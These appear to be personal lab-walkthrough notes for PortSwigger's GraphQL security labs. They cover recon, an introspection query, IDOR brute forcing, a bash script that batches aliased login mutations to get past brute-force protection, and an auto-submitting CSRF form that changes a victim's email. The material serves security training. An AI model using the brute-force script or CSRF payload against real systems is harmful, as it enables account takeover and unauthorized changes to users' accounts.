## Recon

- Browse site and capture requests in burp suite. If the site uses graphql inql will highlight the requests in purple.
- Scan url with wafw00f with endpoint detection
    - Send intruspection query with inql to get schema
    - Check if GET based introspection queries are allowed
        - Right-click the request and select GraphQL > Save GraphQL queries to site map






## [Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)

- Look for a GET request with an intiger that returns data like blog posts.
- Send the request to the intruder and brute force the intiger.
- Check for any sensitive information in the responses.

**You should find a password in this lab.**



## [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

- Look for GET requests that return PII like usernames and passwords based on an intiger
- Send the request to the intruder, brute force a list of numbers and check for PII leaks



## [Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

- Fingerprint the graphql endpoint with wafw00f
- Test query with GET request
```
GET /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```
- Right-click the request and select GraphQL > Save GraphQL queries to site map
- Find a request to perform unautherized actions like deleting a user



## [Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)

- Find a login function via graphql
- Run this script to create a field duplication query to send 100 login attempts at the same time

```bash
#!/bin/bash

PASSWORDS_FILE=$1

if [ -z "$PASSWORDS_FILE" ]; then
  echo "Usage: $0 <passwords_file>"
  exit 1
fi

MUTATIONS=""
i=1
while IFS= read -r password; do
  MUTATIONS+="  login${i}: login(input: {username: \"carlos\", password: \"${password}\"}) {\n    token\n    success\n  }\n"
  ((i++))
done < "$PASSWORDS_FILE"

echo -e "mutation GeneratedOperation {\n${MUTATIONS}}"
```

- Use this password list from portswigger: [Authentication lab passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)


## [Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)

- Scan endpoint with graphql-cop and look for possible CSRF attacks
- Use this POC to perform CSRF via urlencode bypass

```html
<!DOCTYPE html>
<html>

<body>
    <form id="csrfForm" action="https://YOUR-LAB-ID.web-security-academy.net/graphql/v1" method="POST">
        <input type="hidden" name="query" value="
        mutation changeEmail($input: ChangeEmailInput!) {
          changeEmail(input: $input) {
            email
          }
        }
      ">
        <input type="hidden" name="operationName" value="changeEmail">
        <input type="hidden" name="variables" value='{"input":{"email":"hacker1@hackerone.com"}}'>
    </form>

    <script>
        document.getElementById("csrfForm").submit(); // Auto-submit when victim visits the page
    </script>
</body>

</html>
```

